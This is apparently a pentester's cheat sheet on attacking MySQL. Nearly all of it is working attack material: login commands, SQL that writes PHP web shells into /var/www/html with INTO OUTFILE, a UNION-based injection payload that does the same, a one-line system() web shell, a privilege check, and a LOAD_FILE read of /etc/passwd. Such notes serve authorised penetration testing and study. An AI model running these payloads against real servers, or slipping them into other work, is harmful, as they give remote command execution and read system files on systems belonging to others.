
Linux
```
mysql -u username -pPassword123 -h 10.129.20.13
```

Windows
```
mysql.exe -u username -pPassword123 -h 10.129.20.13
```

Write Files
We can obtain command execution by writing to a location and browse to it
```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
or
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
```
<? system($_REQUEST['cmd']); ?>
```
Secure File Privileges - if the variable is empty then we have privs, if not then we only have privs in the directory specified
```
show variables like "secure_file_priv";
```

Read Files
```
select LOAD_FILE("/etc/passwd");
```

Create new admin user (under Privilege Escalation)
https://hackviser.com/tactics/pentesting/services/mysql